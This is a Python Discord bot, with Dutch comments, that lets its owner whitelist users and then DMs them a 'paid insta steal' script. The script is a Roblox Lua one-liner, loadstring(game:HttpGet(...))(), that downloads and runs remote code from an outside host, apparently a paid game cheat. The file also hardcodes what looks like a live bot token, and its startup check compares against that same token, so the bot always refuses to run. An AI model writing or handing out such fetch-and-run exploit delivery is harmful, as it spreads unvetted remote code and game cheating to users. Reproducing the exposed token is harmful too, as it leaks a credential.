import discord
from discord.ext import commands
from discord import app_commands

# VUL HIER JE BOT TOKEN IN
TOKEN = "MTQ2OTcwODAzODYxNjI1NjYxNQ.GDCor0.HkeZP1B6WWPN86ZUUC73eT-YYiOvCDN9lkeeeA"  # <-- hier komt je Discord bot token

# Jouw Discord ID (owner)
OWNER_ID = 1260264286614196326

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# In-memory whitelist
whitelist = set()

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} slash commands.")
    except Exception as e:
        print(e)

# Owner-only whitelist command
@bot.tree.command(name="whitelist", description="Whitelist a user (owner only)")
@app_commands.describe(member="The member to whitelist")
async def whitelist_user(interaction: discord.Interaction, member: discord.Member):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("you are not owner", ephemeral=True)
        return

    whitelist.add(member.id)
    await interaction.response.send_message("succesful added whitelist")

# Public paid-insta-steal command
@bot.tree.command(name="paid-insta-steal", description="Get the paid insta steal script")
async def paid_insta_steal(interaction: discord.Interaction):
    if interaction.user.id not in whitelist:
        await interaction.response.send_message("You are not whitelisted.")
        return

    # DM message
    message = 'Here is your insta steal: loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/155c6ad769510879d83fa70b213f172dd79aac4b94fb591dd2075460d28a54df/download"))().'

    try:
        await interaction.user.send(message)
        await interaction.response.send_message("Check your DMs.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message(
            "I cannot send you a DM. Please enable DMs from server members.",
            ephemeral=True,
        )

if __name__ == "__main__":
    if TOKEN == "MTQ2OTcwODAzODYxNjI1NjYxNQ.GDCor0.HkeZP1B6WWPN86ZUUC73eT-YYiOvCDN9lkeeeA":
        raise ValueError("You must paste your Discord bot token in the code.")

    bot.run(TOKEN)
